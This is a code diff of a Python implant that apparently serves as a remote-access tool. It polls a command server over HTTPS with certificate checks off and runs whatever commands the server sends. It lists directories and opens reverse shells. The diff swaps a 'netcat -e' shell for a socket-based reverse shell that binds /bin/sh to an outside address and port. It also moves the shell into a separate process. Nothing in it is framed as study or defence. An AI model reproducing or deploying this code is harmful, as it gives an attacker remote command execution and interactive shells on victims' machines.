@@ -1,19 +1,29 @@
 import subprocess as sp
 import threading
 import time
-
+import multiprocessing
 import requests as r
 import urllib3
-
+import socket
+import os
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 HOST = "192.168.178.107"
-PORT = 10000
+PORT = 9999
 SERVICE = "https"
 URL = f"{SERVICE}://{HOST}:{PORT}"
 
 
-def reverse_shell(address: int, port: int, binary: str):
-    sp.getoutput(f"netcat -e {binary} {address} {port}")
+def reverse_shell(address: str, port: int):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address, int(port)))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    sp.call(["/bin/sh","-i"])
+
 
 data = {
     "address": "192.168.178.107",
@@ -27,7 +37,6 @@ while True:
         tasks = r.get(URL + "/tasks/" + name, verify=False)
     except:
         continue
-    print(tasks.status_code)
     tasks = tasks.json()
     for task in tasks:
         if task["type"] in ["rce", "dir", "reverse-shell"]:
@@ -39,11 +48,7 @@ while True:
                 data["output"] = sp.getoutput(task["args"]["cmd"])
             elif task["type"] == "dir":
                 data["output"] = sp.getoutput("ls " + task["args"]["dir"])
-            elif task["type"] == "reverse-shell": 
-                threading.Thread(target=reverse_shell, kwargs={"address":task['args']["address"], "port":task['args']["port"], "binary": task['args']["binary"]}).start()
+            elif task["type"] == "reverse-shell":
+                multiprocessing.Process(target=reverse_shell, args=(task["args"]["address"], task["args"]["port"])).start()
                 data["output"] = "Send reverse shell"
             res = r.post(URL + "/finish/" + name, json=data, verify=False)
-
-            
-
-        
